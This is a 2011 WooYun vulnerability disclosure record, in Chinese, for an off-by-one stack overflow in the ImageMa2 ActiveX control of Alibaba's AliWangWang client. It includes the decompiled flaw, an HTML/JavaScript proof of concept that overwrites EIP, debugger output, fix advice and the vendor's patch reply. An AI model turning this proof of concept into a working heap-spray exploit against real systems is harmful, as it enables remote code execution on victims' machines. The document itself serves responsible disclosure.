{"id": 23445, "wybug_id": "wooyun-2011-01380", "wybug_title": "淘宝阿里旺旺远程ActiveX栈溢出漏洞", "wybug_corp": "阿里巴巴", "wybug_author": "wjb", "wybug_date": "2011-02-21 14:18", "wybug_open_date": "2011-02-26 15:00", "wybug_type": "远程代码执行", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "漏洞已经通知厂商但是厂商忽略漏洞", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["缓冲区溢出", "浏览器插件漏洞", "漏洞", "栈溢出", "远程代码执行", "浏览器漏洞利用技巧"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2011-02-21：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2011-02-26：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： 这个应该是WooYun-2011-01334的升级版漏洞，在最新版中依然存在。 详细说明：  ImageMa2 ActiveX IDL文件如下： [      uuid(D81C6073-919F-4F3A-B12C-7EAF0F6B1F90),      helpstring(\"ImageManager2 Class\")    ]    coclass ImageManager2 {        [default] interface IImageManager2;        [default, source] dispinterface _IImageManager2Events;    };    [      odl,      uuid(F068E587-4F89-4949-8FA5-82EF935F688A),      helpstring(\"IImageManager2 Interface\"),      dual,      oleautomation    ]    interface IImageManager2 : IDispatch {        [id(0x00000001), helpstring(\"method ManualPic\")]        HRESULT ManualPic(BSTR szFileName);        [id(0x00000002), helpstring(\"method AutoPic\")]        HRESULT AutoPic(                        BSTR szFileName,                         BSTR* szOut);        [id(0x00000003), propget, helpstring(\"property url\")]        HRESULT url([out, retval] BSTR* pVal);        [id(0x00000003), propput, helpstring(\"property url\")]        HRESULT url([in] BSTR pVal);        [id(0x00000004), propget, helpstring(\"property containerType\")]        HRESULT containerType([out, retval] BSTR* pVal);        [id(0x00000004), propput, helpstring(\"property containerType\")]        HRESULT containerType([in] BSTR pVal);        [id(0x00000005), propget, helpstring(\"property functionCallback\")]        HRESULT functionCallback([out, retval] BSTR* pVal);        [id(0x00000005), propput, helpstring(\"property functionCallback\")]        HRESULT functionCallback([in] BSTR pVal);        [id(0x00000006), propget, helpstring(\"property draw\")]        HRESULT draw([out, retval] BSTR* pVal);        [id(0x00000006), propput, helpstring(\"property draw\")]        HRESULT draw([in] BSTR pVal);        [id(0x00000007), propget, helpstring(\"property action\")]        HRESULT action([out, retval] BSTR* pVal);        [id(0x00000007), propput, helpstring(\"property action\")]        HRESULT action([in] BSTR pVal);        [id(0x00000008), propget, helpstring(\"property secureKey\")]        HRESULT secureKey([out, retval] BSTR* pVal);        [id(0x00000008), propput, helpstring(\"property secureKey\")]        HRESULT secureKey([in] BSTR pVal);        [id(0x00000009), propget, helpstring(\"property company\")]        HRESULT company([out, retval] BSTR* pVal);        [id(0x00000009), propput, helpstring(\"property company\")]        HRESULT company([in] BSTR pVal);        [id(0x0000000a), propget, helpstring(\"property loginId\")]        HRESULT loginId([out, retval] BSTR* pVal);        [id(0x0000000a), propput, helpstring(\"property loginId\")]        HRESULT loginId([in] BSTR pVal);        [id(0x0000000b), propget, helpstring(\"property picid\")]        HRESULT picid([out, retval] BSTR* pVal);        [id(0x0000000b), propput, helpstring(\"property picid\")]        HRESULT picid([in] BSTR pVal);        [id(0x0000000c), propget, helpstring(\"property Response\")]        HRESULT Response([out, retval] BSTR* pVal);        [id(0x0000000c), propput, helpstring(\"property Response\")]        HRESULT Response([in] BSTR pVal);        [id(0x0000000d), propget, helpstring(\"property PicFileName\")]        HRESULT PicFileName([out, retval] BSTR* pVal);        [id(0x0000000d), propput, helpstring(\"property PicFileName\")]        HRESULT PicFileName([in] BSTR pVal);        [id(0x0000000e), propget, helpstring(\"property xmlParam\")]        HRESULT xmlParam([out, retval] BSTR* pVal);        [id(0x0000000e), propput, helpstring(\"property xmlParam\")]        HRESULT xmlParam([in] BSTR pVal);    };ImageMa2 ActiveX在处理AutoPic方法时存在一个off-by-one的栈溢出漏洞，我想这个应该是2月18日那个栈溢出漏洞修补后的遗留问题：2月18的公告链接：http://wooyun.org/bugs/wooyun-2010-01334http://bbs.taobao.com/catalog/thread/508895-250539394.htm 因为我在修补过的版本AliIM2010_taobao 6.50.10C的ImageMa2.dll中看到程序员在AutoPic的处理函数中加入了2个返回值检查的地方：1) 调用WideCharToMultiByte()转换unicode字符串时做了返回值检测，这样限制了传入的参数不超过260个字节。WideCharToMultiByte(0, 0, lpWideCharStr, -1, &FullPath, 260, 0, 0)2) 同样在调用strrchr查找'\\'时也做了返回值检测，确保了返回值不为NULL。因为后面mbsnbcpy函数的第三个(size)的参数是strrchr的返回值减去FullPath的起始地址然后加一.strrchr(&FullPath, \"\\\\\"))  但是显然程序员忽略了在sub_100105EB()调用的子函数存在一个off-by-one的栈溢出漏洞。sub_100105EB() -> sub_100103FA() (建议用IDA分析ImageMa2的时候把dll的基地址rebase成0x10001000，这样就能方便定位到我描述的问题所在处了。)sub_100103FA():...//首先调用splitpath分解传入的FullPath到本地变量splitpath(FullPath, &Drive, &Dir, &Filename, &DestStr);...char *filesuffix= (char *)_mbsupr(&DestStr);if ( _mbscmp(filesuffix, \".GIF\") )\tname = \".jpg\";else\tname = \".gif\";strcpy(&DestStr, name);DWORD count = 9999;while ( 1 ){    DWORD rd = rand();    sprintf((char *)&Dest, \"%s%s%s_%04d%s\", &Drive, &Dir, &Filename, rd % 10000, &DestStr);    if (!GetFileAttributesA(&Dest))      break;    count--;    if ( !count )      return 0;}当我们传入的路径不包含后缀名时，该函数会自动帮忙添加.jpg或者.gif的后缀，当我们传入的数据到达260字节后，sprintf打印的文件名为：\"[我们传入的路径]_1234.jpg\"，然后这里程序员忽略了sprintf会自动在缓冲区末尾添加00做截断，从而也就导致了一个stack off-by-one的问题，导致了保存的ebp最后一个字节被覆盖成0的字节，当函数返回时就会跳转至缓冲区内的内容处执行，而这个内容是我们可控的。   漏洞证明：  PoC:<html><object classid='clsid:D81C6073-919F-4F3A-B12C-7EAF0F6B1F90' id='x' /></object><script>var url = \"\"for (var i = 0; i < 0x102; i ++){\turl += \"\\x0c\";}url += \"\\\\\";x.AutoPic(url, \"123\");</script></html>测试环境Windows XP SP3 CN + AliIM2010_taobao 6.50.10C调试输出：sprintf后的内容:0:005> d 01e3f1ac  L 11001e3f1ac  0c 0c 0c 0c 0c 0c 0c 0c-0c 0c 0c 0c 0c 0c 0c 0c  ................01e3f1bc  0c 0c 0c 0c 0c 0c 0c 0c-0c 0c 0c 0c 0c 0c 0c 0c  ................01e3f1cc  0c 0c 0c 0c 0c 0c 0c 0c-0c 0c 0c 0c 0c 0c 0c 0c  ................01e3f1dc  0c 0c 0c 0c 0c 0c 0c 0c-0c 0c 0c 0c 0c 0c 0c 0c  ................01e3f1ec  0c 0c 0c 0c 0c 0c 0c 0c-0c 0c 0c 0c 0c 0c 0c 0c  ................01e3f1fc  0c 0c 0c 0c 0c 0c 0c 0c-0c 0c 0c 0c 0c 0c 0c 0c  ................01e3f20c  0c 0c 0c 0c 0c 0c 0c 0c-0c 0c 0c 0c 0c 0c 0c 0c  ................01e3f21c  0c 0c 0c 0c 0c 0c 0c 0c-0c 0c 0c 0c 0c 0c 0c 0c  ................01e3f22c  0c 0c 0c 0c 0c 0c 0c 0c-0c 0c 0c 0c 0c 0c 0c 0c  ................01e3f23c  0c 0c 0c 0c 0c 0c 0c 0c-0c 0c 0c 0c 0c 0c 0c 0c  ................01e3f24c  0c 0c 0c 0c 0c 0c 0c 0c-0c 0c 0c 0c 0c 0c 0c 0c  ................01e3f25c  0c 0c 0c 0c 0c 0c 0c 0c-0c 0c 0c 0c 0c 0c 0c 0c  ................01e3f26c  0c 0c 0c 0c 0c 0c 0c 0c-0c 0c 0c 0c 0c 0c 0c 0c  ................01e3f27c  0c 0c 0c 0c 0c 0c 0c 0c-0c 0c 0c 0c 0c 0c 0c 0c  ................01e3f28c  0c 0c 0c 0c 0c 0c 0c 0c-0c 0c 0c 0c 0c 0c 0c 0c  ................01e3f29c  0c 0c 0c 0c 0c 0c 0c 0c-0c 0c 0c 0c 0c 0c 0c 5f  ..............._01e3f2ac  39 39 37 38 2e 6a 70 67-00 f5 e3 01 04 06 03 03  9978.jpg........当上层函数返回后，我们可以看到eip被修改成我们控制的内容了：eax=00000000 ebx=00000000 ecx=00000210 edx=00000210 esi=03193748 edi=01e3f4eceip=03030604 esp=01e3f2cc ebp=01e3f500 iopl=0         nv up ei pl zr na pe nccs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246ImageMa2!DllUnregisterServer+0x9f34:03030604 c20800          ret     80:005> kbChildEBP RetAddr  Args to Child              WARNING: Stack unwind information not available. Following frames may be wrong.01e3f500 0c0c0c0c 0c0c0c0c 0c0c0c0c 0c0c0c0c ImageMa2!DllUnregisterServer+0x9f3401e3f5fc 77105cd9 03193748 001d70f4 022e1a2c <Unloaded_sspc.dll>+0xc0c0bfb01e3f61c 771062e8 03193748 00000020 00000004 OLEAUT32!DispCallFunc+0xc301e3f6ac 03027660 02345f04 03193748 00000000 OLEAUT32!DispCallFunc+0x6d201e3f6d4 3db58b4f 03193748 00000002 3db31234 ImageMa2!DllUnregisterServer+0xf9001e3f714 3dd64167 03193748 00000002 00000409 mshtml!DllGetClassObject+0xc9c8101e3f754 3dd63bc8 002201d0 00000002 00000409 mshtml!ConvertAndEscapePostData+0x8966001e3f788 75be29d7 002201d0 00000002 00000409 mshtml!ConvertAndEscapePostData+0x890c101e3f7c0 75be2947 009ac210 02a81450 00000002 jscript!DllCanUnloadNow+0x6a0e01e3f7f8 75be31e5 009ac210 02a81450 00000002 jscript!DllCanUnloadNow+0x697e01e3f868 75be1c0a 009ac210 02a81450 00000002 jscript!DllCanUnloadNow+0x721c01e3f8b0 75be1211 009ac210 01e3f8d0 00000001 jscript!DllCanUnloadNow+0x5c4101e3f8f0 75be11c6 009ac210 00000001 00000000 jscript!DllCanUnloadNow+0x524801e3f914 75be311d 009ac210 00000000 00000001 jscript!DllCanUnloadNow+0x51fd01e3f9cc 75be1123 01e3fa10 00000000 009ad6b0 jscript!DllCanUnloadNow+0x715401e3f9e4 75be0f8a 01e3fa10 00000000 00000000 jscript!DllCanUnloadNow+0x515a01e3fa54 75bd3777 009ad6b0 01e3fc04 00000000 jscript!DllCanUnloadNow+0x4fc101e3faa4 75bcc357 01e3fc04 01e3fbe4 009ac00c jscript!DllGetClassObject+0x572801e3fb08 75bcc1a8 022dc56c 0023034c 00000000 jscript+0xc35701e3fb34 3dad2af5 009ac00c 022dc56c 0023034c jscript+0xc1a8当然在完全返回之前还有一个读写内存的异常：(dfc.638): Access violation - code c0000005 (first chance)First chance exceptions are reported before any exception handling.This exception may be expected and handled.eax=022e38f4 ebx=00000000 ecx=03194208 edx=00000022 esi=0c0c0c0c edi=01e3f4eceip=03031d01 esp=01e3f2d8 ebp=01e3f500 iopl=0         nv up ei pl zr na pe nccs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010246ImageMa2!DllUnregisterServer+0xb631:03031d01 8906            mov     dword ptr [esi],eax  ds:0023:0c0c0c0c=????????我们只需要在Heap Spray中填充这个地址的内容即可，时间仓促就暂不提供working的PoC了。   修复方案：  编译器选项加入 /GS把sprintf换成可限制长度的如snprintf，或者用更安全的API代替。   版权声明：转载请注明来源 wjb@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2011-02-26 15:00 厂商回复：  漏洞Rank：20  (WooYun评价) 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2011-02-26 15:11 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:18        | 当我又回首一切,这个世界会好吗?)\t\t \n  厂商忽略了啊    \n     2011-02-26 15:47 |    \t\t饮恨 \t\t\t( 实习白帽子  |\t\t\t        Rank:38 漏洞数:6        | 既然选择了远方就必须日夜兼程)\t\t \n  为什么没rank呢    \n     2011-02-26 16:09 |    \t\t蚊虫 \t\t\t( 实习白帽子  |\t\t\t        Rank:36 漏洞数:12        | 我装逼这么牛可还是没妞喜欢我)\t\t \n  这个太深奥了..    \n     2011-02-26 19:47 |    \t\tpg5yl8 \t\t\t( 实习白帽子  |\t\t\t        Rank:91 漏洞数:12        | 我神马都不会 但我常常被人日 这是为神马呢)\t\t \n  完全看不懂····但我还是拉下来了 请不要怪我    \n     2011-02-26 21:19 |    \t\tXunix \t\t\t( 路人 |\t\t\t        Rank:25 漏洞数:5        | 闲的蛋疼，跑来扯淡。有谁家还招人不？求包...)\t\t \n  这个专业啊，太详细了。赞    \n     2011-02-28 12:53 |    \t\t阿里巴巴(乌云厂商)\t\t \n  2月21日wjb同时将该漏洞报给阿里巴巴集团（阿里巴巴、淘宝、支付宝）的漏洞收集邮箱：security@service.alibaba.com。我们在第一时间对此漏洞做出响应，2月22日修复了该漏洞，2月24日发布了安装包和升级包。security@service.alibaba.com，对于提交漏洞给我们安全信箱的同仁，我们都会提交一份小礼物，聊表谢意。感谢wjb，感谢所有给阿里巴巴集团报过漏洞的安全人员，感谢所有的关注阿里巴巴安全的人，谢谢你们的关注，鞭策着我们前行，我们一直在努力，致力于创造安全的阿里巴巴。    \n     2011-02-28 13:25 |    \t\twjb \t\t\t( 实习白帽子  |\t\t\t        Rank:51 漏洞数:2        | 卖糕的。)\t\t \n  阿里巴巴的确很快的响应了这个漏洞并且在最快时间给出了升级版，wooyun这个忽略应该只是个小失误，一点小小的建议希望发布新的升级版应该同时告知漏洞的风险，以确保更多的阿里巴巴用户的安全。    \n     2011-02-28 13:46 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:18        | 当我又回首一切,这个世界会好吗?)\t\t \n  一点小小的建议希望发布新的升级版应该同时告知漏洞的风险，以确保更多的阿里巴巴用户的安全的确，呵呵，否则很多的人可能会忽视    \n     2011-11-16 10:33 |    \t\tgainover  \t\t\t( 核心白帽子 |\t\t\t        Rank:1710 漏洞数:93        | PKAV技术宅社区! -- gainover| 工具猫网络-...)\t\t \n  - - 高森啊。 看了溢出的书，没看明白的路过。    \n     2013-02-05 12:03 |    \t\tbombless \t\t\t( 路人 |\t\t\t        Rank:5 漏洞数:1        | 熟悉x86汇编、C语言及系统编程。实战经验较...)\t\t \n  挺精彩的。不过现在的浏览器都开DEP了，这里好像没有谈到绕过DEP的内容。    \n     2013-06-13 01:12 |    \t\tdigVul \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:1        )\t\t \n  又是类似于stackoverflow的漏洞.为什么被忽略？是因为又升级了,或者内部已解决了?    \n     2014-11-27 15:17 |    \t\tpx1624 \t\t\t( 普通白帽子  |\t\t\t        Rank:1036 漏洞数:175        | px1624)\t\t \n  诶，看不懂的路过。。    \n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}